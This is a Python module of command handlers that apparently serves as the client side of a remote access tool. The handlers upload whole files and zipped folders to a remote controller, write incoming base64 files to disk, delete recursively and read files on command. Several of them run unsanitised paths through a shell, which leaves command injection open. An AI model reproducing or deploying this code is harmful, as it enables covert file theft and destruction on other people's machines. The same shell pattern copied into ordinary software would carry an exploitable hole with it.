import os
import shutil
import subprocess
import base64
import shlex


def download_file(protocol, file_name):
    try:
        content = protocol.recv()
        with open(file_name, 'wb') as f:
            f.write(base64.b64decode(content))
    except Exception as e:
        protocol.send(f'[-] Error receiving file: {str(e)}')


def upload_file(protocol, file_name):
    try:
        file_to_send = file_name
        is_dir = False

        if os.path.isdir(file_name):
            is_dir = True
            shutil.make_archive(file_name, 'zip', file_name)
            file_to_send = file_name + '.zip'

        with open(file_to_send, 'rb') as f:
            protocol.send(base64.b64encode(f.read()).decode())

        if is_dir:
            os.remove(file_to_send)

    except Exception as e:
        protocol.send(f'[-] Error: {str(e)}')


def list_dir(protocol, platform, path=None):
    cmd = platform.list_dir_cmd(path)
    result = subprocess.run(cmd, shell=True, capture_output=True)
    output = _decode_output(result.stdout, result.stderr)
    protocol.send(output)


def change_dir(protocol, target):
    try:
        os.chdir(target)
        protocol.send(f'[+] Changed directory to: {os.getcwd()}')
    except Exception as e:
        protocol.send(f'[-] Error changing directory: {str(e)}')


def current_dir(protocol):
    protocol.send(os.getcwd())


def delete(protocol, arg_str):
    try:
        target_path = arg_str.strip()
        if target_path.startswith('"') and target_path.endswith('"'):
            target_path = target_path[1:-1]

        recursive = False
        if target_path.startswith('-r '):
            recursive = True
            target_path = target_path[3:].strip()
            if target_path.startswith('"') and target_path.endswith('"'):
                target_path = target_path[1:-1]

        if os.path.exists(target_path):
            if os.path.isdir(target_path):
                if recursive:
                    shutil.rmtree(target_path)
                    protocol.send(f'[+] Directory deleted recursively: {target_path}')
                else:
                    try:
                        os.rmdir(target_path)
                        protocol.send(f'[+] Directory deleted: {target_path}')
                    except OSError:
                        protocol.send(f'[-] Directory not empty. Use "rm -r {target_path}"')
            else:
                os.remove(target_path)
                protocol.send(f'[+] File deleted: {target_path}')
        else:
            protocol.send('[-] Path not found')
    except Exception as e:
        protocol.send(f'[-] Error deleting: {str(e)}')


def move(protocol, arg_str):
    try:
        args = shlex.split(arg_str, posix=False)
        if len(args) >= 2:
            shutil.move(args[0], args[1])
            protocol.send(f'[+] Moved {args[0]} to {args[1]}')
        else:
            protocol.send('[-] Usage: mv <source> <dest>')
    except Exception as e:
        protocol.send(f'[-] Error moving: {str(e)}')


def read_file(protocol, platform, path):
    cmd = platform.read_file_cmd(path.strip())
    result = subprocess.run(cmd, shell=True, capture_output=True)
    output = _decode_output(result.stdout, result.stderr)
    protocol.send(output)


def touch(protocol, platform, path):
    cmd = platform.touch_cmd(path.strip())
    subprocess.run(cmd, shell=True, capture_output=True)
    protocol.send(f'[+] Created: {path.strip()}')


def _decode_output(stdout, stderr):
    result = stdout + stderr
    try:
        return result.decode('utf-8', errors='replace')
    except Exception:
        try:
            return result.decode('latin-1', errors='replace')
        except Exception:
            return str(result)
